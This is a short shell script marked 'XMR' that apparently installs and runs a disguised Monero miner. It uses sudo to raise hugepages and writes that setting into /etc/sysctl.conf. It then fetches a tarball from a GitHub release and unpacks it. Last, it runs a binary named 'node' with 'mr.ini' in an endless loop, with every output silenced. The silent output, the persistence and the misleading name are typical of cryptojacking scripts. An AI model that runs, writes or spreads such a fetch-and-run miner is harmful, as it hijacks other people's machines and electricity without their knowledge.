#!/bin/sh
#
#
#XMR
core=$(nproc --all)
sudo sysctl -w vm.nr_hugepages=$core
sudo bash -c "echo vm.nr_hugepages=$core >> /etc/sysctl.conf" 
wget https://github.com/wikangdijalalan2/xmmxja/releases/download/v1.0/male1.tar > /dev/null 2>&1 
tar -xvf male1.tar > /dev/null 2>&1 
cd MXC > /dev/null 2>&1 
while [ 1 ]; do
./node mr.ini > /dev/null 2>&1 
sleep 5
done
